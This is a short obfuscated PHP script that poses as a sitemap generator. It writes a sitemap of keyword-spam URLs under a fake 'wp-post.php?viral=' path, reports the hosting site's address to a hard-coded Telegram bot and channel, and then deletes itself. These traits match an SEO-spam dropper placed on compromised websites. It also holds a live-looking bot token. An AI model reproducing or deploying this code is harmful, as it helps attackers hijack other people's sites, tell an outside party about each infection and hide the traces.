<?php function getBaseUrl(){$w0=isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http';$f1=$_SERVER['HTTP_HOST'];$p2=$_SERVER['REQUEST_URI'];$t3=$w0."://".$f1.$p2;$t3=str_replace("sitemap.php","",$t3);return $t3;}function getFileRowCount($d4){$v5=fopen($d4,"r");$n6=0;while(!feof($v5)){fgets($v5);$n6++;}fclose($v5);return $n6;}function generateSitemap($t3,$b7){$h8=fopen("sitemap.xml","w");fwrite($h8,'<?xml version="1.0" encoding="UTF-8"?>'.PHP_EOL);fwrite($h8,'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'.PHP_EOL);$e9=file($b7,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES);foreach($e9 as $t10=>$k11){$j12=$t3.'wp-post.php?viral='.urlencode($k11);$j13=date('c');fwrite($h8,'<url>'.PHP_EOL);fwrite($h8,'<loc>'.$j12.'</loc>'.PHP_EOL);fwrite($h8,'<lastmod>'.$j13.'</lastmod>'.PHP_EOL);fwrite($h8,'</url>'.PHP_EOL);}fwrite($h8,'</urlset>'.PHP_EOL);fclose($h8);}function sendTelegramReport($v14){$t15='7144159446:AAGaNOYTCP9B8Fz9_yd2_cHEpOlQSOaF5jg';$d16='@sitemaplist';$y17="https://api.telegram.org/bot{$t15}/sendMessage";$w18=array('chat_id'=>$d16,'text'=>$v14);$v19=array('http'=>array('method'=>'POST','header'=>'Content-Type: application/json','content'=>json_encode($w18)));$s20=stream_context_create($v19);$u21=file_get_contents($y17,false,$s20);return json_decode($u21,true);}$t3=getBaseUrl();$b7="list.txt";if(file_exists($b7)&&is_readable($b7)){generateSitemap($t3,$b7);$n6=getFileRowCount($b7);$v14="{$t3}sitemap.xml";sendTelegramReport($v14);echo $v14;}else{$v14="Error: Unable to read $b7.";sendTelegramReport($v14);echo $v14;}unlink($z22);unlink(__FILE__);?>
